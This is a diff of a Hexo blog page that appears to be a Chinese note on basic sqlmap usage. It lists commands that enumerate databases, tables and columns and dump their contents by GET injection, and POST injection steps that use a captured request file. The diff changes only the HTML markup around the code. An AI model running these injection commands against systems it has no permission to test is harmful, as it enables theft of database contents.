@@ -248,14 +248,14 @@
               <p>一些简单的sqlmap命令</p>
 <span id="more"></span>
 <h2 id="get注入基本用法"><a href="#get注入基本用法" class="headerlink" title="get注入基本用法"></a>get注入基本用法</h2><p>相关代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py &quot;url&quot; --dbs<br>python sqlmap.py -D &quot;数据库&quot; --tables<br>python sqlmap.py -D &quot;数据库&quot; -T &quot;表&quot; --columns<br>python sqlmap.py -D &quot;数据库&quot; -T &quot;表&quot; -C &quot;列&quot; --dump<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqlmap">python sqlmap.py &quot;url&quot; --dbs<br>python sqlmap.py -D &quot;数据库&quot; --tables<br>python sqlmap.py -D &quot;数据库&quot; -T &quot;表&quot; --columns<br>python sqlmap.py -D &quot;数据库&quot; -T &quot;表&quot; -C &quot;列&quot; --dump<br></code></pre></div></td></tr></table></figure>
 
 <h2 id="post注入基本用法"><a href="#post注入基本用法" class="headerlink" title="post注入基本用法"></a>post注入基本用法</h2><p>1、先对页面进行抓包</p>
 <p>2、找到相对应的注入点前后加上*</p>
 <p>3、保存为txt文档到桌面</p>
 <p>4、对txt文档进行sql注入</p>
 <p>相关代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">pyhon sqlmap.py -r 文本文件 --dbs          //查看所有数据库,若执行不出，可在后面加--level=3代表注入等级<br>pyhon sqlmap.py -r 文本文件 --current-db    //查看当前数据库<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqlmap">pyhon sqlmap.py -r 文本文件 --dbs          //查看所有数据库,若执行不出，可在后面加--level=3代表注入等级<br>pyhon sqlmap.py -r 文本文件 --current-db    //查看当前数据库<br></code></pre></div></td></tr></table></figure>
 
 <hr>
 <p>title: test2<br>date: 2019-10-26 17:14:26<br>tags:<br>    - 小工具<br>    - hexo<br>    - yilia<br>    - tag</p>
